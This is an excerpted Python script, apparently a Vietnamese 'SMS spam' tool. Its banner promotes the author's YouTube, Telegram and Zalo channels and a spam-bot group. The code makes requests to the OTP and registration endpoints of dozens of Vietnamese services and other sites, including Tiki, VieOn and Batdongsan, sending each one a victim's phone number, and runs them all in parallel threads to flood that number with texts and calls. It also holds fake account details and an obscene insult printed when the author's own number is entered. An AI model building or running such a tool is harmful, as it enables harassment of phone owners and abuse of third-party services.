...
\033[1;37m |━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━|
\033[1;91m |━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━|
\033[1;33m Youtube : youtube.com/@longnguyenvanmedia
\033[1;32m Contact Telegram : @longnguyenvanmedia
\033[1;31m Contact Zalo : fb.com/long.nguyen.van.media
\033[1;35m Group Chat Telegram : https://t.me/botspamsms
\033[1;91m  Tool spam sms vip V1
\033[1;35m |━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━|
\033[1;31m |━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━|
...
if phone == "0334063029":
  print("SPAM SỐ TAO CÁI CON MẸ MÀY À ")
  exit()
...
def tiki(phone):
    response_tiki = requests.post('https://tiki.vn/api/v2/customers/otp_codes', headers=ua, json=jphone).text  
...
def CAYDENTHAN(phone):
    phone = "84" + phone
    phone = "84" + phone.replace("840", "")
    head = [
    ...
    data = '{"full_name":"Khang pro","first_name":"pro","last_name":"Khang","mobile_phone":"' + phone + '","target_url":"caydenthan.vn/"}'
...
def ONCREDIT(phone):
    ...
    data = "data%5BtypeData%5D=sendCodeReg&data%5Bphone%5D=" + phone + "&data%5Bemail%5D=khangksjjrf%40gmail.com&data%5Bcaptcha1%5D=1&data%5Blang%5D=vi&CSRFName=CSRFGuardajax&CSRFToken=" + token
...
def VIEON(phone):
    ...
    data = 'phonenumber=' + phone + '&password=123456789&givenname=&deviceid=598a3da6a4b7d1450b2a247bd080ca9d&platform=mobileweb&model=Android%2012&pushtoken=&devicename=Chrome%2F96&devicetype=desktop&ui=012021'
...
def BATDONGSAN(phone):
  ...
  url = "https://m.batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister?phoneNumber=" + phone
...
def PHUCLONG(phone):
    ...
    data = {'phoneNumber': phone, 'fullName': 'Nguyễn Đặng Hoàng Hải', 'email': 'vexnolove03@gmail.com', 'password': 'Vrxx#1337'}
    datason = json.dumps(data)
...
def OLDFACEBOOK(phone):
    ...
    data = "emailorusername=" + urlencode(phone) + "&recaptchachallengefield="
    headers = [
        "Content-Type: application/x-www-form-urlencoded",
        "X-Requested-With: XMLHttpRequest",
...
def run(phone,i):                  
  threading.submit(tv360,phone)#1
  threading.submit(winmart,phone)#2
  threading.submit(apispam,phone)#3
  threading.submit(vieon,phone)#4
  threading.submit(poyeye,phone)#5
  threading.submit(alfrescos,phone)#6
  threading.submit(fpt,phone)#7
  threading.submit(kiot,phone)#8
  threading.submit(vayvnd,phone)#9
  threading.submit(viettel,phone)#10
  threading.submit(tamo,phone)#11 
  threading.submit(meta,phone)#12
  threading.submit(funring,phone)#13
  threading.submit(dkvt,phone)#14
  ...
  threading.submit(CAYDENTHAN,phone)
  ...
  threading.submit(SELLY,phone)
  threading.submit(KIDSPLAZA,phone)
  threading.submit(ICANKID,phone) 
  threading.submit(RIVIU,phone)
  threading.submit(VOSO,phone)
  threading.submit(THITRUONGSI,phone)
  threading.submit(BATDONGSAN,phone)
  ...
  threading.submit(F88,phone)
  threading.submit(TIENOI,phone)
  threading.submit(VIETTELL,phone)
  ...
  threading.submit(thantaioi,phone)
  threading.submit(oldsenmo,phone)   
  ...
  threading.submit(SWIFT247,phone)
  threading.submit(spamcall,phone)
  threading.submit(KILO,phone)
  threading.submit(GAPO,phone) 
  print("[ GBCHUCHE ] Send Sms - Call | Api - Vip | Delay : 5 | Status : Thành Công ",)  
  for j in range(0, 5):
    # code trong vòng lặp
    print(f" GBCHUCHE | HMEO MEO MEO 🇻🇳 \r",end="")
